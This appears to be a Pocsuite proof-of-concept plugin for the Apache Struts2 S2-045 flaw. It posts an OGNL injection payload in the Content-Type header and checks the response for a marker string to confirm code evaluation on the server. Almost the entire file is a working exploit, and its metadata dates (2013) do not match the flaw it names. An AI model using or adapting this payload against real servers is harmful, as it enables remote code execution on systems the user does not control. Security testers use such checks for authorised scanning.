#!/usr/bin/python
# -*- coding: utf-8 -*-


from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register


class Struts45POC(POCBase):
    name = 'struts045'
    vulID = '0'  # https://www.seebug.org/vuldb/ssvid-78176
    author = ['bey0nd']
    vulType = 'Command Execution'
    version = '1.0'    # default version: 1.0
    references = ['']
    desc = '''struts2-045'''

    vulDate = '2013-02-14'
    createDate = '2013-02-14'
    updateDate = '2013-02-14'

    appName = 'struts'
    appVersion = 'struts'
    appPowerLink = 'struts'
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        self.headers['Content-type'] = "%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('bey0nd')).(#o.close())}"
        resp = req.post(self.url,headers = self.headers)
        if resp and resp.text and resp.status_code == 200:
            if "bey0nd" in resp.text:
                result['FileInfo'] = {}
                result['FileInfo']['Filename'] = "bey0nd"
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output

register(Struts45POC)
